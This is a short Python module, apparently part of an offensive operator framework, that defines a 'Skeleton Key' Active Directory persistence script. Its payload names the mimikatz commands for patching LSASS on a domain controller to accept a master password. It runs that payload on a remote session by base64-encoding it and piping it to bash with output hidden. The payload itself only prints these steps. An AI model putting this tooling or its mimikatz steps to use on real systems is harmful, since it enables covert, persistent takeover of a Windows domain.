"""Skeleton key AD attack script."""
from ..base import OperatorScript, ScriptResult

class SkeletonKey(OperatorScript):
    name = "Skeleton Key"
    description = "Skeleton key AD attack"
    category = "persist"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] SKELETON KEY ATTACK"
echo "Patches LSASS on DC to allow master password"
echo "mimikatz: privilege::debug"
echo "mimikatz: misc::skeleton"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Skeleton key info...[/bold cyan]")
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            return ScriptResult(success=True, output="Skeleton key info executed")
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
